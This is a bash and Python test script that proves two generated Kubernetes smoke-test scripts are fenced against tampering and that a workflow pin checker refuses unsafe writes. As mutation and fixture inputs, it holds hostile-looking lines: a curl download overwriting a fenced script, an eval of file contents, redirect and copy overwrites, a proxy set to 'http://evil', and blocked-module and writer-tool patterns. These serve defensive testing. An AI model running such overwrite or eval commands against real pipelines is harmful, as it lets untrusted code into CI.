#!/usr/bin/env bash
# proves: REQ-REL-005-AC1
# Advisor 0084 (4): the k8s acceptance harness runs the customer commands of docs/kubernetes.md verbatim (rule 12). Its two generated scripts
# (/tmp/pf-forward and /tmp/smoke-assert) are fenced: both are written by one committed python script ONLY from docs/kubernetes.md at the
# checked-out commit - no environment, no network, no other input - and nothing else writes them. The harness now lives in Check's listed
# scripts (bin/acceptance-k8s-smoke.py writes them, bin/acceptance-k8s.sh runs them; REQ-CHAIN-006-AC5); the pin checker no longer needs to
# exclude any generated file, so its exclusion list is empty and the fence is proven here on those two files. Every fence fact is proven twice:
# it holds on the real files, and a copy of the files with that one fact removed fails it (a fence that cannot fail proves nothing).
# The refusals of the pin checker that guard a fenced file stay proven below on a fixture workflow, with an injected exclusion.
set -euo pipefail
root=$(cd "$(dirname "$0")/../../.." && pwd)
# the vendored pure-Python PyYAML as `yaml` (the coverage job's python has none of its own), like check-action-pins-test.sh
pylib=$(mktemp -d); trap 'rm -rf "$pylib"' EXIT
ln -s "$root/.github/agent/fixtures/testlib/pyyaml" "$pylib/yaml"
export PYTHONPATH="$pylib${PYTHONPATH:+:$PYTHONPATH}"
python3 - "$root" <<'PY'
import ast, importlib.util, os, re, subprocess, sys, tempfile
root = sys.argv[1]
passed = failed = 0
def check(name, ok, got=""):
    global passed, failed
    if ok: passed += 1; print("ok:", name)
    else: failed += 1; print("FAIL:", name, "->", got)
SMOKE = open(os.path.join(root, "bin/acceptance-k8s-smoke.py")).read()
SUITE = open(os.path.join(root, "bin/acceptance-k8s.sh")).read()
DOC = open(os.path.join(root, "docs/kubernetes.md")).read()
FENCED = ("/tmp/pf-forward", "/tmp/smoke-assert")
WRITERS = r"(^|[\s;|&])(cp|mv|ln|install|tee|rsync|dd|tar|unzip|curl|wget)\b[^\n;|&]*"

def generate(src, env, doc):
    d = tempfile.mkdtemp(); os.makedirs(os.path.join(d, "docs"))
    open(os.path.join(d, "docs/kubernetes.md"), "w").write(doc)
    code = src.replace("/tmp/", d + "/out-")
    subprocess.run([sys.executable, "-c", code], cwd=d, env=env, check=True, capture_output=True)
    return {f: open(os.path.join(d, "out-" + f)).read() for f in ("pf-forward", "smoke-assert")}

def facts(src, suite):
    """{fact name: bool} for one copy of the two files. A fact that cannot be evaluated is False (fail closed)."""
    out = {}
    names = ("its only input file is docs/kubernetes.md", "it writes the two fenced scripts", "no network or process module")
    try:
        tree = ast.parse(src)
        opens = [n for n in ast.walk(tree) if isinstance(n, ast.Call) and getattr(n.func, "id", "") == "open"]
        reads = [ast.literal_eval(n.args[0]) for n in opens if len(n.args) < 2 or ast.literal_eval(n.args[1]) == "r"]
        writes = sorted(ast.literal_eval(n.args[0]) for n in opens if len(n.args) >= 2 and ast.literal_eval(n.args[1]) == "w")
        mods = {a.name.split(".")[0] for n in ast.walk(tree) if isinstance(n, (ast.Import, ast.ImportFrom))
                for a in (n.names if isinstance(n, ast.Import) else [ast.alias(n.module or "")])}
        out[names[0]] = reads == ["docs/kubernetes.md"]
        out[names[1]] = set(FENCED) <= set(writes)
        out[names[2]] = not mods & {"urllib", "http", "socket", "requests", "subprocess", "ftplib"}
    except (SyntaxError, ValueError, TypeError):
        for k in names:
            out[k] = False
    gnames = ("the environment does not change what the scripts run", "the port-forward script is the doc's own command",
              "a doc change is what changes the scripts")
    try:
        base = dict(PATH=os.environ["PATH"], CLIENT_LOCAL="fscache-client:accept")
        a = generate(src, base, DOC)
        b = generate(src, dict(base, PF_CMD="docker run alpine", HOME="/x", FSCACHE_ADDR=":1", HTTPS_PROXY="http://evil"), DOC)
        c = generate(src, base, DOC.replace("port-forward", "port-forward --address 127.0.0.1"))
        out[gnames[0]] = a == b
        out[gnames[1]] = "kubectl" in a["pf-forward"] and "port-forward" in a["pf-forward"]
        out[gnames[2]] = c["pf-forward"] != a["pf-forward"]
    except (subprocess.CalledProcessError, OSError, KeyError):
        for k in gnames:
            out[k] = False
    # nothing else writes the fenced scripts: in the suite they are only run (bash PATH ...), never redirected into, copied or downloaded
    out["nothing else in the suite writes a fenced script"] = not any(
        re.search(WRITERS + re.escape(p), suite) or re.search(r">\s*" + re.escape(p), suite) for p in FENCED)
    out["the suite runs both fenced scripts"] = all(re.search(r"^bash " + re.escape(p), suite, re.M) for p in FENCED)
    return out

real = facts(SMOKE, SUITE)
for name, ok in real.items():
    check("fence fact holds on the real files: " + name, ok)

# each fact, removed in turn from a copy, must turn exactly that fact red
mutants = [
    ("its only input file is docs/kubernetes.md", SMOKE + '\nopen("/etc/hostname").read()\n', SUITE),
    ("it writes the two fenced scripts", SMOKE.replace('open("/tmp/smoke-assert", "w")', 'open("/tmp/elsewhere", "w")'), SUITE),
    ("no network or process module", "import subprocess\n" + SMOKE, SUITE),
    ("the environment does not change what the scripts run", SMOKE.replace('"#!/usr/bin/env bash\\n" + pf_cmd', '"#!/usr/bin/env bash\\n" + os.environ.get("PF_CMD", "") + pf_cmd'), SUITE),
    ("the port-forward script is the doc's own command", SMOKE.replace('"#!/usr/bin/env bash\\n" + pf_cmd + "\\n"', '"#!/usr/bin/env bash\\ntrue\\n"'), SUITE),
    ("a doc change is what changes the scripts", SMOKE.replace('"#!/usr/bin/env bash\\n" + pf_cmd + "\\n"', '"#!/usr/bin/env bash\\nkubectl port-forward x\\n"'), SUITE),
    ("nothing else in the suite writes a fenced script", SMOKE, SUITE + "\necho id > /tmp/pf-forward\n"),
    ("nothing else in the suite writes a fenced script", SMOKE, SUITE + "\ncp /tmp/x /tmp/smoke-assert\n"),
    ("nothing else in the suite writes a fenced script", SMOKE, SUITE + "\ncurl -fsSL https://example.invalid/x -o /tmp/pf-forward\n"),
    ("the suite runs both fenced scripts", SMOKE, SUITE.replace("bash /tmp/smoke-assert", "true")),
]
for fact, src, suite in mutants:
    got = facts(src, suite)
    check("removing the fact turns it red: " + fact, got.get(fact) is False, got.get(fact))

# the pin checker's exclusion list names nothing now (the harness is no longer a workflow step), and its refusals still work on a fixture
spec = importlib.util.spec_from_file_location("p", os.path.join(root, ".github/agent/bin/check-action-pins.py"))
P = importlib.util.module_from_spec(spec); spec.loader.exec_module(P)
check("the pin checker excludes no generated file", dict(P.GENERATED_OK) == {}, dict(P.GENERATED_OK))
FX = ".github/workflows/fixture-fence.yml"
P.GENERATED_OK.clear()
P.GENERATED_OK[(FX, "/tmp/pf-forward.sh")] = "fixture"           # injected for this test only; the real list stays empty
P.GENERATED_OK[(FX, "/tmp/smoke-assert.sh")] = "fixture"
try:
    bad = []
    P.check_runs(".github/workflows/x.yml.jobs.j.steps[0].run", [("x", 'c=$(cat /tmp/c); eval "$c"', None)], bad)
    check("any other eval of a variable is refused", bool(bad), bad)
    bad = []
    P.check_runs(".github/workflows/x.yml.jobs.j.steps[0].run", [("x", "bash /tmp/pf-forward.sh", None)], bad)
    check("the same file name in another workflow is refused", bool(bad), bad)
    for name, extra in [("a redirect", "echo id > /tmp/pf-forward.sh"), ("a copy", "cp /tmp/x /tmp/smoke-assert.sh"),
                        ("a download", "curl -fsSL https://example.invalid/x -o /tmp/pf-forward.sh"),
                        ("a bash -c write", "bash -c 'printf id > /tmp/smoke-assert.sh'")]:
        bad = []
        P.check_runs(FX + ".jobs.k8s.steps[0].run",
                     [(FX + ".jobs.k8s.steps[0].run", extra, None),
                      (FX + ".jobs.k8s.steps[1].run", "bash /tmp/pf-forward.sh; bash /tmp/smoke-assert.sh", None)], bad)
        check("a fenced script that %s also writes is refused (Codex #164 r3, N04)" % name, bool(bad), bad)
    bad = []
    P.check_runs(FX + ".jobs.k8s.steps[0].run", [(FX + ".jobs.k8s.steps[0].run", "bash /tmp/pf-forward.sh", None)], bad)
    check("the fenced script with no other writer passes", not bad, bad)
finally:
    P.GENERATED_OK.clear()
print("k8s-harness-fence: %d passed, %d failed" % (passed, failed))
sys.exit(1 if failed else 0)
PY
